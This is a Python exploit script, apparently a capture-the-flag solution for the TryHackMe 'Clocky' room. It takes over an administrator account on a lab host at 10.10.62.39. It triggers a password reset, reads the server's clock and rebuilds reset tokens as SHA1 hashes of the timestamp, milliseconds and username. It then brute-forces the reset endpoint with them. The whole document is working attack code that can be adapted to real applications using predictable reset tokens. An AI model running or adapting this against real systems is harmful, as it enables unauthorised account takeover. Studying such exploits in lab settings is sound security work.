import datetime
import hashlib
import requests
import re

# This is the script I used to solve Clocky on TryHackMe

# Set the target URL
base_url = 'http://10.10.62.39:8080/'

# Send a POST request to synchronize time
data = {"username": "administrator"}
requests.post(base_url + "forgot_password", data=data)

# Send a GET request to fetch the current time
response = requests.get(base_url)
if response.status_code == 200:
    time_pattern = r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})'
    match = re.search(time_pattern, response.text)
    if match:
        current_time_str = match.group(1)
        print("Synchronized time:", current_time_str)  

        # Generate and check valid tokens
        valid_tokens = []
        for ms in range(100):
            ms_str = str(ms).zfill(2)  
            token_data = current_time_str + "." + ms_str + " . " + "administrator".upper()
            hashed_token = hashlib.sha1(token_data.encode("utf-8")).hexdigest()
            response = requests.get(base_url + 'password_reset', params={'token': hashed_token})
            if '<h2>Invalid token</h2>' not in response.text:
                print(f'Generated token: {hashed_token}') 
                valid_tokens.append(hashed_token)

        print("Generated tokens:", valid_tokens) 
    else:
        print("Error: Could not parse server time from response.")
else:
    print("Error: Failed to fetch server response.")
